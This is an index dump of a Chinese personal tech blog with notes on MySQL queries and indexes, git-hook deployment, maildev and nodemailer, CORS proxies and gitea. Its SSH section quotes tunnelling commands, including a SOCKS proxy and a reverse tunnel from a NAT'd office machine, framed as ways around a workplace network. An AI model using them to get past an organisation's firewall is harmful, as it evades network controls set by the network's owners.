date和date_format小記","uri":"/blog/posts/mysql-date%E5%92%8Cdate-format%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"今天終於找到我以前下子查詢沒辦法抓到外面的表原因 這兩個其實不難分，不要被兩個專有名詞嚇到 先講非相關子查詢，簡單講就是子查詢跟外面 SQL 查詢內容沒有相關 非相關子查詢只會跑一次，所以效能上會非常快 執行順序也比外層先，所以這也是為什麼非相關子查詢沒法取得外層欄位的原因 SQL 子查詢筆記(相關子查詢/非相關子查詢) | 程式狂想筆記 ","date":"2018-12-24","objectID":"/blog/posts/%E7%B5%82%E6%96%BC%E7%9F%A5%E9%81%93%E7%82%BA%E4%BB%80%E9%BA%BC%E5%AD%90%E6%9F%A5%E8%A9%A2%E6%B2%92%E8%BE%A6%E6%B3%95%E6%8A%93%E5%8F%96%E5%A4%96%E9%9D%A2%E7%9A%84%E8%A1%A8/:0:0","tags":["mysql","sql","子查詢"],"title":"終於知道為什麼子查詢沒辦法抓取外面的表","uri":"/blog/posts/%E7%B5%82%E6%96%BC%E7%9F%A5%E9%81%93%E7%82%BA%E4%BB%80%E9%BA%BC%E5%AD%90%E6%9F%A5%E8%A9%A2%E6%B2%92%E8%BE%A6%E6%B3%95%E6%8A%93%E5%8F%96%E5%A4%96%E9%9D%A2%E7%9A%84%E8%A1%A8/"},{"categories":["MySQL"],"content":"其實子查詢 JOIN 沒辦法抓到外面的表 放在 select 跟 where 都可以查 SELECT ( SELECT b.uid FROM `xxxxxxxx` b where b.`date` = a.`date` and b.uid = a.uid ) as a FROM `xxxxxxxx` a where `date` = '2017-12-01' and uid = '2239124893975610' 之前也有寫過這篇 SQL ON /WHERE 差別 | 程式狂想筆記 希望以後寫子查詢可以順順利利 ","date":"2018-12-24","objectID":"/blog/posts/%E7%B5%82%E6%96%BC%E7%9F%A5%E9%81%93%E7%82%BA%E4%BB%80%E9%BA%BC%E5%AD%90%E6%9F%A5%E8%A9%A2%E6%B2%92%E8%BE%A6%E6%B3%95%E6%8A%93%E5%8F%96%E5%A4%96%E9%9D%A2%E7%9A%84%E8%A1%A8/:1:0","tags":["mysql","sql","子查詢"],"title":"終於知道為什麼子查詢沒辦法抓取外面的表","uri":"/blog/posts/%E7%B5%82%E6%96%BC%E7%9F%A5%E9%81%93%E7%82%BA%E4%BB%80%E9%BA%BC%E5%AD%90%E6%9F%A5%E8%A9%A2%E6%B2%92%E8%BE%A6%E6%B3%95%E6%8A%93%E5%8F%96%E5%A4%96%E9%9D%A2%E7%9A%84%E8%A1%A8/"},{"categories":["MySQL"],"content":"最近做時間查詢一個月資料 但是盡然沒有吃到 index 我抓一天、兩天資料都有吃到 抓到超過 20 天竟然就吃不到 覺得這個問題好像滿嚴重 ","date":"2018-12-24","objectID":"/blog/posts/date%E5%9C%A8%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%B2%92%E5%90%83%E5%88%B0index/:0:0","tags":["sql","index"],"title":"date在查詢大量資料沒吃到index","uri":"/blog/posts/date%E5%9C%A8%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%B2%92%E5%90%83%E5%88%B0index/"},{"categories":["MySQL"],"content":"大量資料吃 index 未必是壞事 記得之前去聽一個研討會 當欄位資料別少的時候(姓別：男、女) 但大量資料，資料分散造成讀取不是連續的 會造今資料不會很快 所以這時候 full scan 不是壞事 但今過爬文找到Re: [SQL ] mysql date column index 問題 - 看板 Database - 批踢踢實業坊 首先你要知道 INDEX 是另外存的 也佔空間 也吃 FILE IO 也就是說 透過 INDEX 其實不一定比較快 例如你有一個 TABLE 總共佔了 10000 個 block 然後建了一個 index , 這個 index 本身佔了 2000 個 block 假設你今天要找的資料 在整個 table 的 10000 個 blocks 裡， 散布在其中的 9000 個 blocks 裡面。 這時候 你透過 index 找資料的 IO 成本就會是 2000 + 9000 = 11000 而 Full Table Scan 的 IO 成本只有 10000 像這樣的時候， DBMS 就會選擇直接做 Table Scan 因為成本比較低。 那 DBMS 怎麼知道哪條路成本比較低呢 就來自它本身對這些 表格/索引 的統計值 以 Oracle 舉例 跟這樣行為有關的參數就包括有 1. 最佳化器嘗試組出最佳路徑的嘗試次數上限 2. 最佳化器判斷 走 index 的成本 大於 Full Table Scan 成本的多少比例以上 就走 Full Scan 3. 最佳化器優化的方向(最小IO , 最快回應等 回到你提的問題 從你下的參數中我們可以注意到幾件事 1. 在你指定的範圍內資料量較小的時候 DBMS 會覺得該走 index 2. 在你指定的範圍內資料量較大的時候 DBMS 選擇走 FULL SCAN 3. 你下了 select * 這代表所有不在INDEX上的欄位，DBMS都必須要翻 DATA BLOCKS出來才能拿到資料 但是在你的資料中 0000-00-00 的資料量到底有多少？ 如果只有很小一點點 (或是 DBMS 覺得它只佔一點點 那麼使用 FULL SCAN 是很正常的。 反正你都得翻這些資料出來，何必脫褲子放屁去 index blocks 再繞一圈呢？ 但是如果 這樣的資料是佔多數的 那或許是你的表格/索引的統計值出問題了。導致 DBMS 覺得這樣比較快 * 有另一個狀況 就是 DBMS 在處理 function(col) 這些操作的時候 因為存在 index 裡的資料是 col 而非 function(col) 所以 DBMS 會覺得這個 index 是與需求不符的 會放棄 ** 然後 資料量大的話 會慢是正常的啊 有吃 IO 吃CPU 就有開銷就是要花工夫啊 你只能避免它繞冤枉路 該走的路還是免不了的 其實 MySQL 被評效能不好，不過看樣子是 DB 選擇最佳方案 看到這個就讓他放手去做 full scan 不然就做大數據 XD(其實我不會) ","date":"2018-12-24","objectID":"/blog/posts/date%E5%9C%A8%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%B2%92%E5%90%83%E5%88%B0index/:1:0","tags":["sql","index"],"title":"date在查詢大量資料沒吃到index","uri":"/blog/posts/date%E5%9C%A8%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%B2%92%E5%90%83%E5%88%B0index/"},{"categories":["MySQL"],"content":"強制做 index 查詢 select count(*) from http_log_3 force index(time) where time \u003e= 000000 注意 這邊的 index(index名字) 如我上面圖片要寫成 : force index(idx_date) 這邊有範例通過 force index 了解的 MySQL 查詢的性能優化 | 不分享空間 可以看到跑出來結果差很多 所以我們還是要相信 MySQL XDD Mysql 的强制索引（Force Index）都为我们做了哪些优化？ - 愿今日的一切困难在未来都不值一提 - ITeye 博客 其他問題小記 老天尊的死期: MySQL 常見問題 mysql 的 process 堵塞处理 | Sayue’s Blog ","date":"2018-12-24","objectID":"/blog/posts/date%E5%9C%A8%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%B2%92%E5%90%83%E5%88%B0index/:2:0","tags":["sql","index"],"title":"date在查詢大量資料沒吃到index","uri":"/blog/posts/date%E5%9C%A8%E6%9F%A5%E8%A9%A2%E5%A4%A7%E9%87%8F%E8%B3%87%E6%96%99%E6%B2%92%E5%90%83%E5%88%B0index/"},{"categories":["MySQL"],"content":"MySQL最近做count時候 發現有一個寫法很特別 特別記錄一下 另外MySQL like查詢預設不分大小寫 其他DB我記得預設會分大小寫 不常寫應該很容易忘記 ","date":"2018-12-19","objectID":"/blog/posts/MySQL-count-%E5%92%8C-Like-%E6%9F%A5%E8%A9%A2%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql","like"],"title":"MySQL count 和 Like 查詢大小寫問題小記","uri":"/blog/posts/MySQL-count-%E5%92%8C-Like-%E6%9F%A5%E8%A9%A2%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"DB LIKE到底有沒有分大小寫呢? MySQL , SQL Server沒有分 Oracle,DB2有分 要讓mysql查詢區分大小寫，可以： select * from table_name where binary a like ‘a%’ MySQL 的 LIKE 查詢區分大小寫 | InspireGate 派克空間 SQL：SELECT英數字不分大小寫、不分全半形、忽略空白 @ 姊姊❉心得報告 :: 痞客邦 :: sql - How do you force mysql LIKE to be case sensitive? - Stack Overflow Java程式教學甘仔店: Oracle SQL LIKE的用法教學 ","date":"2018-12-19","objectID":"/blog/posts/MySQL-count-%E5%92%8C-Like-%E6%9F%A5%E8%A9%A2%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/:1:0","tags":["mysql","like"],"title":"MySQL count 和 Like 查詢大小寫問題小記","uri":"/blog/posts/MySQL-count-%E5%92%8C-Like-%E6%9F%A5%E8%A9%A2%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/"},{"categories":["MySQL"],"content":"count 今天問比較資深工程師會怎麼用 他說他會用count(1) 不過仔細查看了一下 count(欄位)是我平常使用的方法，我知道當null時候不會算進去 count(1)會算null值 执行效果上： count(*)包括了所有的列，相当于行数，在统计结果的时候，不会忽略列值为NULL count(1)包括了忽略所有列，用1代表代码行，在统计结果的时候，不会忽略列值为NULL count(列名)只包括列名那一列，在统计结果的时候，会忽略列值为空（这里的空不是只空字符串或者0，而是表示null）的计数，即某个字段值为NULL时，不统计。 --------------------- 作者：BigoSprite 来源：CSDN 原文：https://blog.csdn.net/iFuMI/article/details/77920767 版权声明：本文为博主原创文章，转载请附上博文链接！ count(1)、count(*)与count(列名)的执行区别 - iFuMI的博客 - CSDN博客 備份圖 Select Count(*) / Count(1) / Count(欄位名) 的差異 | Jeff 隨手記 - 點部落 最近太忙了，因為還沒有時間消化 所以先放在這邊 Fake2db - もっともらしいダミーデータを作る事ができるPythonツール | ソフトアンテナブログ bhrgu/fake2db-tests: Several tests for the fake2db project MySQL-如何刪除hash表分區 - 掃文資訊 MYSQL的分区字段，必须包含在主键字段内 - 王 庆 - 博客园 mysql 的 partition与key的关系、限制 - barfoo的专栏 - CSDN博客 mysql 表分區技術 - 掃文資訊 ［MySQL］MySQL分区与传统的分库分表 - 海天的笔记本 | haitian-coder MySQL Partitioning a VARCHAR(60) - Stack Overflow 聊聊partition的方式 - code-craft - SegmentFault 思否 MySQL分区总结 - iVictor - 博客园 Orcale搜尋資料且不分大小寫 @ 這是林葛格的窩 :: 隨意窩 Xuite日誌 SQL：SELECT英數字不分大小寫、不分全半形、忽略空白 @ 姊姊❉心得報告 :: 痞客邦 :: Select Count(*) / Count(1) / Count(欄位名) 的差異 | Jeff 隨手記 - 點部落 count(1)、count(*)与count(列名)的执行区别 - iFuMI的博客 - CSDN博客 20萬筆資料，Mysql資料庫就跑不動囉! (排序相關) linux - How to do the port forwarding from one ip to another ip in same network? - Server Fault 15個優化你的sql Query的方式 | Davidou的 Blog Undefined index php - Google 搜尋 網站設計筆記: PHP Notice: undefined index 完美解决方法 [解決] PHP Notice: Undefined index和Undefined variable的解决方法 « 關於網路那些事… 對 MySQL 的 VARCHAR 欄位使用 INDEX 時可以增加效率的方法… – Gea-Suan Lin’s BLOG SQL：SELECT英數字不分大小寫、不分全半形、忽略空白 @ 姊姊❉心得報告 :: 痞客邦 :: MySQL 的 LIKE 查詢區分大小寫 | InspireGate 派克空間 为什么oracle区分大小写？_oracle_帮酷编程问答 sql - How do you force mysql LIKE to be case sensitive? - Stack Overflow SQL Fiddle Like Case Sensitive in MySQL - Stack Overflow postgresql like case insensitive - Google 搜尋 MySQL 裡搜尋 CHAR/VARCHAR (String) 欄位時要注意的事情 – Gea-Suan Lin’s BLOG ","date":"2018-12-19","objectID":"/blog/posts/MySQL-count-%E5%92%8C-Like-%E6%9F%A5%E8%A9%A2%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/:2:0","tags":["mysql","like"],"title":"MySQL count 和 Like 查詢大小寫問題小記","uri":"/blog/posts/MySQL-count-%E5%92%8C-Like-%E6%9F%A5%E8%A9%A2%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%95%8F%E9%A1%8C%E5%B0%8F%E8%A8%98/"},{"categories":["Git"],"content":"其實最近想git有甚麼好方法做部屬動作 蒐集網路一些方法 都是delete all file再刪除…. 但感覺這種作法，會讓服務中斷 有想到用git pull更新方法 但Server Web目錄會有git 雖然有想到用git方法 不過最終有找到不錯的做法 ","date":"2018-12-15","objectID":"/blog/posts/git-push%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E9%83%A8%E5%B1%AC%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/:0:0","tags":["git"],"title":"git push簡單自動部屬程式方法","uri":"/blog/posts/git-push%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E9%83%A8%E5%B1%AC%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/"},{"categories":["Git"],"content":"Git 如何針對其他路徑下的 Repository 執行指令 最近剛好看到這篇 git -–git-dir={專案路徑}.git\\ -–work-tree={專案路徑} {git 指令} 看到這個舊感覺能用在git簡單部屬上面 所以就稍微在我Linux電腦主機上面玩了一下 簡單原理git-dir運用在git 資料夾，這邊範例是.git結尾 我一開始以為一定要用bare 但後來發現，除了可以用bare當git 還能用一般project_dir/.git/ work-tree 就是要對應其路徑 看到這個就能感覺輕鬆部屬 .git/hooks/post-receive # !/bin/sh # checkout HEAD git --get-dir=xxxxx/.git/ --work-tree=xxxx(部屬位置) checkout -f chmod +x .git/hooks/post-receive How to deploy projects with Git - Buddy 雖然感覺也是能用git reset --hard head 不過網路上用這個比較多 也有看到做之前git checkout -f做git stash 雖然這篇是透過push git repo去做更新 但我覺得不應該讓bare有兩個 改天push錯就GG XD 之前也有研究用caddy-git使用webhook初體驗 | 程式狂想筆記 感覺可以運用這個上面 then command [args...]應該就可以做git --get-dir=xxxxx/.git/ --work-tree=xxxx(部屬位置) checkout -f 目前在想 dev_git --push--\u003egit reop --\u003e webhook --\u003e caddy webhook --\u003e git deploy 當然這邊只能做不需要編譯的部屬 例如PHP應該能這樣做 說不定哪天就有機會可以用到 2019-12-16 最近看到這篇 Hugo 博客折腾记 - 咸鱼的小鱼塘 有Webhook 程式 adnanh/webhook: webhook is a lightweight incoming webhook server to run shell commands 簡單可以用 shell 部屬 但我還沒測試過 不知道同一個時間做 webhook ，會不會影響部屬? 另類部屬方法 手摸手带你部署git服务器实现自动发布代码 - 个人文章 - SegmentFault 思否 通过Git将Hexo博客部署到服务器 - 掘金 上面有寫到 其他參考來源: Git 面試題 - Git 教學 | 高見龍 abiosoft/caddy-git: git middleware for Caddy simple-php-git-deploy,使用PHP和Git自動部署代碼,下載simple-php-git-deploy的源碼_GitHub_幫酷 从Git部署一个PHP项目到没有安装Git的服务器 - 代码日志 安全的代码部署 · php笔记 · 看云 SegmentFault git 服务器 搭建/自动部署/远程连接 | Caoxl’s Blog git hook实践心得 - 腾讯Web前端 IMWeb 团队社区 | blog | 团队博客 git remote add with other SSH port - Stack Overflow 用caddy-git使用webhook初體驗 | 程式狂想筆記 abiosoft/caddy-git: git middleware for Caddy ","date":"2018-12-15","objectID":"/blog/posts/git-push%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E9%83%A8%E5%B1%AC%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/:1:0","tags":["git"],"title":"git push簡單自動部屬程式方法","uri":"/blog/posts/git-push%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E9%83%A8%E5%B1%AC%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"早上看到Backend 台灣 (Backend Tw) 傳統老人要連上production db的方法： ... ２　把自己電腦的public key放到這台nano machine上的authorized_keys，以便自己電腦不用每次ssh都要輸入密碼。 ３　每次要連上mysql時，先建立ssh port forwarding ssh -L 9000:yourDBhostname:3306 smallPotato@abc.com ４　然後，看你喜歡用phpMyAdmin也好，mysql bench也好，連線上localhost:9000，這樣子便能連線上production db 以上內容來自Backend 台灣 (Backend Tw) Triton Ho 之前有用過ssh tunnel 代理網頁來看 但沒想到可以用在MySQL 可能以前沒有深入理解這怎麼傳的 (\u003e////\u003c) 早上看FB看到ssh port forwarding 沒想到還有這種操作 長期用phpmyadmin真的很痛苦 但是用這個方法可以用workbench連到MySQL(內網) 想說有沒有快速的方法 ","date":"2018-12-13","objectID":"/blog/posts/ssh-port-forward%E9%80%A3MySQL%E6%96%B9%E6%B3%95/:0:0","tags":["mysql","port forward"],"title":"ssh port forward連MySQL方法(SSH Tunnel)","uri":"/blog/posts/ssh-port-forward%E9%80%A3MySQL%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"DBeaver DBeaver Community | Free Universal Database Tool 連線設定可以設定SSH Tunnel 這樣以後一鍵迅速連MySQL 設定非常簡單簡單，也不需要打ssh指令 ","date":"2018-12-13","objectID":"/blog/posts/ssh-port-forward%E9%80%A3MySQL%E6%96%B9%E6%B3%95/:1:0","tags":["mysql","port forward"],"title":"ssh port forward連MySQL方法(SSH Tunnel)","uri":"/blog/posts/ssh-port-forward%E9%80%A3MySQL%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"SSH 相關資料 由於我家裡沒有兩個不同網段 所以我就沒有實驗 但基於理解還是仔細爬了一下網路文章 不太想花太多時間研究 簡單整理一下 Local port forwarding ssh -L \u003clocal_port\u003e:\u003ctarget_host\u003e:\u003ctarget_port\u003e remote_user@remote_host Remote port forwarding (Reverse SSH) ssh -R 5900:localhost:22 guest@remote-pc SOCKS Proxy Forwarding ssh -C -D 8080 cwliu@123.123.123.123 SSH Tunnel 備份圖 Local port forwarding 和 SOCKS Proxy Forwarding 感覺兩個都好像 有看到上班族ssh tunnel求生手冊 [論壇 - Ubuntu 與工具程式及軟體推薦] | Ubuntu 正體中文站 備份圖 範例1： 在公司，透過外面的電腦當proxy，連到外面。 ssh -NfD 8888 remote_ip -N : 不執行任何命令 -f : 在背景執行 -D : 建socks5 的proxy 這時候,瀏覽器和msn在socks 5 proxy設定的欄位填上localhost:8888 。 連出去的連驗就是加密，並且是穿過remot_ip的連線。 範例2: 在公司，透過外面的電腦連BBS。 ssh -NfL 2323:bbs.gamer.com.tw:23 remote_ip -L : 將local port 轉向 telnet localhost 2323 就可以連到巴哈，而且是加密的。 也可用PCManx連localhost 2323也是一樣的意思。 範例3: 有時候假日，想要連回公司加個班。 但是公司是NAT，所以沒辦法這樣作。 可以運用TCP雙向傳輸的特性來辦到這件事。 ssh -NfR 2222:localhost:22 remote_ip -R : 將remote port轉向 .... 範例一和範例二差別在於 SOCKS Proxy 的建立。這是因為 HTTP Proxy 會貼上/處理/取下額外的資訊，不能直接轉送(Forwarding)。範例二就真的是照本宣科地轉送。(當然，兩者轉送之前都有加密。) 簡單來說Local port forwarding只能對外一個port轉出去，所以不能用在看網頁上面 但是SOCKS Proxy Forwarding就可以對印remote可以連到的主機做連線(而且是多個) 這個用在網頁上面很方便 當然還有查了一些: 除了目前連mysql感覺其他地方目前用不上 所以先留著筆記 SSH Forwarding 內部網路連線 – 繁華上海城 ＆ 邊緣小宅女 – Medium 備份圖 SSH Tunnel Reverse SSH Tunnel實際運用，搭配auotssh永不斷線，putty建立反向tunnel :: 哇哇3C日誌 使用 autossh 建立反向 SSH 连接 · 不立不破 利用SSH Tunnel連線至內部網路 - LinXblog 用 SSH Tunnel 來避免防火牆阻擋實作與反制 | Mr. 沙先生 玩转SSH端口转发 | Fundebug博客 87showmin的筆記本: ssh port forwarding using Putty SSH Tunnel 通道打造加密 Proxy，透過外部 Linux 伺服器上網 - G. T. Wang 在 bash 中設定 Proxy server - 蘋果小豬筆記 What is my IP address? — ifconfig.co 上班族ssh tunnel求生手冊 [論壇 - Ubuntu 與工具程式及軟體推薦] | Ubuntu 正體中文站 Date: 2018-12-20 Filezilla預設沒有做ssh tunnel 但有找到WinScp能做到 winScp如何通过隧道代理进行远程连接 - KoMiles - 博客园 WinSCP使用教學 | FAQ Book SSH使用教程( Bitvise Tunnelier+Chrome+Proxy Switchy) - 掃文資訊 瀏覽器設定 proxy 透過 SSH Tunnel 連線網站 | SSORC.tw DownloadManager实现版本更新，监听下载进度 - 简书 SSH Tunneling (Port Forwarding) 詳解 · John Engineering Stuff 備份圖 發現上面介紹很清楚，忘記可以回來看。 ","date":"2018-12-13","objectID":"/blog/posts/ssh-port-forward%E9%80%A3MySQL%E6%96%B9%E6%B3%95/:2:0","tags":["mysql","port forward"],"title":"ssh port forward連MySQL方法(SSH Tunnel)","uri":"/blog/posts/ssh-port-forward%E9%80%A3MySQL%E6%96%B9%E6%B3%95/"},{"categories":["實用工具"],"content":"最近使用cors anywhere 簡單使用 有遇到不該遇到的雷 這邊小記 CORS-ANYWHERE 官網：https://cors-anywhere.herokuapp.com/ Github：https://github.com/Rob–W/cors-anywhere/ 可以到官網clone下來，執行node js ","date":"2018-12-13","objectID":"/blog/posts/cors%E8%B7%A8%E5%9F%9F%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB%E4%BB%A3%E7%90%86-proxy-%E5%B0%8F%E8%A8%98/:0:0","tags":["cors"],"title":"cors跨域資源共享代理(proxy)小記","uri":"/blog/posts/cors%E8%B7%A8%E5%9F%9F%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB%E4%BB%A3%E7%90%86-proxy-%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"踩雷小記 原本我就簡單使用fetch呼叫cors-anywhere，但是一直失敗 其實我也是英文苦守 當下沒注意到有明顯提示 Missing required request header. Must specify one of: origin,x-requested-with fetch並不會塞x-requested-with 當然在postman塞x-requested-with 就可以work了 ","date":"2018-12-13","objectID":"/blog/posts/cors%E8%B7%A8%E5%9F%9F%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB%E4%BB%A3%E7%90%86-proxy-%E5%B0%8F%E8%A8%98/:1:0","tags":["cors"],"title":"cors跨域資源共享代理(proxy)小記","uri":"/blog/posts/cors%E8%B7%A8%E5%9F%9F%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB%E4%BB%A3%E7%90%86-proxy-%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"Corsproxy 可以全局安裝 npm install -g corsproxy corsproxy 但一樣有上面的雷 說不定只有我會踩到orz 也可以去docker hub找 ","date":"2018-12-13","objectID":"/blog/posts/cors%E8%B7%A8%E5%9F%9F%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB%E4%BB%A3%E7%90%86-proxy-%E5%B0%8F%E8%A8%98/:2:0","tags":["cors"],"title":"cors跨域資源共享代理(proxy)小記","uri":"/blog/posts/cors%E8%B7%A8%E5%9F%9F%E8%B3%87%E6%BA%90%E5%85%B1%E4%BA%AB%E4%BB%A3%E7%90%86-proxy-%E5%B0%8F%E8%A8%98/"},{"categories":["Nodejs"],"content":"最近在FB社群看到有人分享fake stmp server 社群連結 之前有測試nodemailer 但是缺少附加檔案可以測試 preview-email - npm無法做到 想說測試這個能不能用 線上服務 Ethereal Email Mailtrap.io — Fake smtp testing server. Dummy smtp email testing 不過…，這兩個不是這文章的重點 ","date":"2018-12-09","objectID":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/:0:0","tags":["nodejs","mail"],"title":"maildev試用筆記","uri":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Nodejs"],"content":"maildev 安裝 官網MailDev - Create better email during development寫了很清楚 ","date":"2018-12-09","objectID":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/:1:0","tags":["nodejs","mail"],"title":"maildev試用筆記","uri":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Nodejs"],"content":"npm安裝 $ npm install -g maildev $ maildev ","date":"2018-12-09","objectID":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/:1:1","tags":["nodejs","mail"],"title":"maildev試用筆記","uri":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Nodejs"],"content":"docker執行 $ docker pull djfarrelly/maildev $ docker run -p 1080:80 -p 1025:25 djfarrelly/maildev ","date":"2018-12-09","objectID":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/:1:2","tags":["nodejs","mail"],"title":"maildev試用筆記","uri":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Nodejs"],"content":"原始檔案安裝 $ git clone git@github.com:djfarrelly/MailDev.git $ npm install -g ./maildev $ maildev ","date":"2018-12-09","objectID":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/:1:3","tags":["nodejs","mail"],"title":"maildev試用筆記","uri":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Nodejs"],"content":"安全憑證記得要關掉 const transport = nodemailer.createTransport({ port: 1025, ignoreTLS: true, // other settings... }); ","date":"2018-12-09","objectID":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/:2:0","tags":["nodejs","mail"],"title":"maildev試用筆記","uri":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Nodejs"],"content":"程式碼執行 拿malagege/sample-code-node-mail-batch: 批次發信範例test_add_file.js 修改 主要要特別注意 ignoreTLS: true auth要拿掉 cid 在多個寄信的時候會在寄信的時候會有問題…. 明明個別設定1.jpg,2.jpg，但是結果兩封信卻都是2.jpg 最後用cid:00000001${data.img}方式解決… 但感覺是maildev問題… 以下code也沒先commit到github上面 /////////(1) const csvFilePath='data.csv' var mail_from = 'from@xxxx.com.tw' var subject = '標題' var nodemailer = require('nodemailer'); const csv=require('csvtojson') /////////(2) var transporter = nodemailer.createTransport({ host: 'localhost', port: 1025 , ignoreTLS: true, // auth: { // user: 'from@xxxx.com.tw', // pass: 'password' // } }); csv() .fromFile(csvFilePath) .then((jsonObj)=\u003e{ // console.log(jsonObj); /** * [ * {a:\"1\", b:\"2\", c:\"3\"}, * {a:\"4\", b:\"5\". c:\"6\"} * ] */ jsonObj.forEach(data =\u003e { /////////(3) let mail_to = data.usermail let email_template = ` Hello World!!!!${data.img} \u003cimg src=\"cid:00000001${data.img}\"/\u003e\u003cbr\u003e 姓名：${data.username}\u003cbr\u003e 訂單編號：${data.no}\u003cbr\u003e ` let mailOptions = { from: mail_from, to: mail_to, //寄送人 subject: subject, html: email_template, attachments: [{ filename: data.img, path: data.img, cid: '00000001'+data.img }] }; // verify connection configuration // transporter.verify(function(error, success) { // if (error) { // console.log(error); // } else { // console.log('Server is ready to take our messages'); // } // }); transporter.sendMail(mailOptions, function(error, info) { if (error) { console.log('mail_to:' + mail_to) console.log(error); } else { console.log(mail_to + ' , Email sent: ' + info.response); } }); }); }) ","date":"2018-12-09","objectID":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/:2:1","tags":["nodejs","mail"],"title":"maildev試用筆記","uri":"/blog/posts/maildev%E8%A9%A6%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Git"],"content":"最近試玩一下gitea 使用choco install gitea 順利安裝成功 預設第一個申請帳號會是管理者 直接進入主題 之前有在想PR後，分支會變成什麼狀況?? 今天實驗用一般PR 合併PR會有兩條branch ","date":"2018-12-06","objectID":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/:0:0","tags":["git"],"title":"gitea試玩合併分支(PR)","uri":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/"},{"categories":["Git"],"content":"gitea 合併分支有兩個選項 PR還有兩種branch(rebase,squash) 稍微google一下 使用 git rebase 提高 PR 质量 - 掘金 備份圖 不過我覺得PR在不傷commit情況下，一般合併應該就可以了 由於最近在想公司 ","date":"2018-12-06","objectID":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/:1:0","tags":["git"],"title":"gitea試玩合併分支(PR)","uri":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/"},{"categories":["Git"],"content":"revert無法取笑merge branch 最近還發現revert不能取消merge branch 雖然我會用git reset 但還是有找了一下 Git怎样撤销一次分支的合并Merge - SegmentFault 思否 git/revert-a-faulty-merge.txt at master · git/git git revert 讓提交不再害怕 - IT閱讀 有機會情境用到來測試看看… ","date":"2018-12-06","objectID":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/:2:0","tags":["git"],"title":"gitea試玩合併分支(PR)","uri":"/blog/posts/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/"},{"categories":["Git"],"content":"PR衝突解決方法 也有爬到PR可能會衝突解決辦法 不過還沒有實驗，先記錄 經過實驗得到很驚奇的結果 PR假如會發生衝突，gitea或gitlab不會讓你做合併動作(按鈕會變灰色的) 但要如何修正呢 當然就一般兩種 merge 先加入fork remote的資訊，在做master做git pull add_remote_name 正常會遇到衝突 就直接解這個問題(git merge –continue) git push上去後，PR那個merge按鈕應該就可以按了 但這個有嚴重的缺點，會自動產生merge commit 其實這也不是缺點，保留當下時間的commit也只有這個方法 所以為了好看，大部分應該都會選擇rebase 使用 git rebase 避免無謂的 merge | ihower { 